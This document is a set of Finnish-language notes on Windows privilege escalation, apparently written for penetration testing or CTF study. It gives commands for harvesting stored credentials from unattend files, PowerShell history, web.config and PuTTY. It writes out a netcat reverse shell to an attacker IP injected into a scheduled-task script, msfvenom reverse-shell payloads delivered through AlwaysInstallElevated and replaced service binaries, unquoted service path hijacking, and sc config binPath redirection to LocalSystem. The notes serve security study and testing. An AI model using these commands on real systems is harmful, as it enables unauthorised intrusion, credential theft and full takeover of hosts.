## Privilege Escalation: Windows

Windowsissa tavalliset käyttäjät kuuluvat Users -käyttäjäryhmään, administraattorit Administrators -käyttäjäryhmään.

Erityiskäyttäjätunnukset:

SYSTEM / LocalSystem: Käyttöjärjestelmän käyttämä tunnus käyttöjärjestelmän sisäisiin toimintoihin. Adminejakin korkeammat oikeudet.

Local Service: Oletuskäyttäjä "minimioikeuksilla" Windowsin palvelujen ajamiseen, anonyymit yhteydet verkon yli.

Network Service: Sama kuin yllä, mutta käyttää tietokoneen tunnuksia autentikoitumiseen verkon yli.

**Selkokielisten tunnusten etsimispaikkoja**

WDS:llä asennetut "Unattended Windows Installations" saattavat jättää admin-tunnuksia näihin sijainteihin:
```bash
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Powershell-historia (cmd.exe ajettuna):
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Tallennetut käyttäjätunnukset:
```cmd
cmdkey /list
```
Jos löytyy kokeilemisen arvoisia, niin:
```cmd
runas /savecred /user:USERNAME cmd.exe
```
IIS konfiguraatioon tallennetut tunnukset:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
PuTTY:n tallentamat Proxy-tunnukset:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
**Ajastetut tehtävät**

Listaa ajastetut tehtävät:
```cmd
schtasks
```
Lisätietoja yksittäisestä tehtävästä:
```cmd
schtasks /query /tn *TaskName* /fo list /v
```
Task to run kertoo ajettavan tiedoston (esim. .bat scripti), Task as user kertoo käyttäjätunnuksen, jolla tehtävä ajetaan. Alla olevalla komennolla tarkistetaan ko. tiedoston kirjoitusoikeudet, ja jos nykyisellä käyttäjällä voidaan kirjoittaa, niin voidaan muokata scriptiä, ja se pyörähtää Task as user-tunnuksella. 
```cmd
icacls C:\polku\tiedostoon\scripti.bat
```
Jos esim. \USERS -käyttäjillä kirjoitusoikeudet, voidaan tehdä reverse shell netcatilla:
```cmd
echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scriptiin\scripti.bat
```
Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
```cmd
nc -lvp 9999
```
Seuraavan ajastuksen yhteydessä aukeaa shell "Task as user" -tunnuksella.

**AllwaysInstallElevated**

Windowsin asennustiedostot .msi käynnistyvät oletuksena käyttäjän oikeuksilla, mutta voidaan konfiguroida käynnistymään myös korkeammilla oikeuksilla. Jos **molemmat** alla olevat rekisteriarvot saadaan päälle onnistuneesti:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
niin voidaan luoda msfvenomilla .msi payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=*Hyökkääjän IP* LPORT=*Hyökkääjän portti* -f msi -o payload.msi
```
ja vastaavilla asetuksilla Metasploit Handler vastaanottamaan yhteys. Kun payload.msi on siirretty kohteelle, ajetaan ao. komento ja reverse shell pitäisi aueta:
```cmd
msiexec /quiet /qn /i C:\polku\kohteeseen\payload.msi
```
## Servicet

Servicet pyörivät Service Control Managerin (SCM) kautta. Jokaisella servicellä on vastaava ohjelma, joka ajetaan. Servicestä tietoa esim.
```cmd
sc qc apphostsvc
```
BINARY_PATH_NAME = ohjelman polku, SERVICE_START_NAME = tunnus, jolla service käynnistetään.

Tarkistetaan ohjelman oikeudet icaclsilla:
```cmd
icacls C:\polku\ohjelmaan\service.exe
```
Jos käyttäjällä muokkausoikeudet (M)/(F), voidaan uudelleenkirjoittaa ko. ohjelma ja se ajetaan servicen ajavalla käyttäjätunnuksella. msfvenom payload esim:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=*Hyökkääjän IP* LPORT=*Hyökkääjän portti* -f exe-service -o service.exe
```
Siirretään päälle, ja annetaan oikeudet:
```cmd
icacls service.exe /grant Everyone:F
```
Jonka jälkeen netcat kuuntelija --> reverse shell, kun service käynnistyy uudelleen.

**Unquoted Service Paths**

Jos servicen BINARY_PATH_NAME ei ole laitettu oikein heittomerkkeihin, syntyy välilyönneistä mahdollisuus hyväksikäytölle. Esim. polun C:\MyPrograms\SFTP Siirto Työkalu\run.exe yrittää SCM arvata oikeaa polkua järjestyksessä:

C:\MyPrograms\SFTP.exe, argumentit "Siirto", "Työkalu\run.exe"

C:\MyPrograms\SFTP Siirto.exe, argumentit "Työkalu\run.exe"

C:\MyPrograms\SFTP Siirto Työkalu\run.exe

Jos käyttäjällä on MyPrograms -kansioon kirjoitusoikeudet, voidaan luoda msfvenomilla payload nimellä SFTP.exe ja viedä se MyPrograms -kansioon, jolloin servicen uudelleenkäynnistyessä se suoritetaan serviceen asetetulla käyttäjätunnuksella.

**Servicen config-muutosoikeudet**

Jos käyttäjä voi muuttaa servicen konfigurointia, voi hyökkääjä muuttaa suoritettavan komennon toiseksi ja saada tätä kautta ajettua omaa koodia servicen käynnistystunnuksena. Apuna voidaan käyttää windowsin AccessChk -työkalua. Tarkistetaan servicen configurointioikeudet:
```cmd
C:\polku\accesschk64.exe -qlc servicen_nimi
```
Jos havaitaan, että konffeja voidaan muuttaa: luodaan payload, tuodaan kohteelle, annetaan ajo-oikeudet:
```cmd
icacls C:\polku\payload.exe /grant Everyone:F
```
jonka jälkeen muutetaan config ohjaamaan payloadiin (huomaa välilyönnit):
```cmd
sc config servicen_nimi binPath= "C:\polku\payload.exe" obj= LocalSystem
```


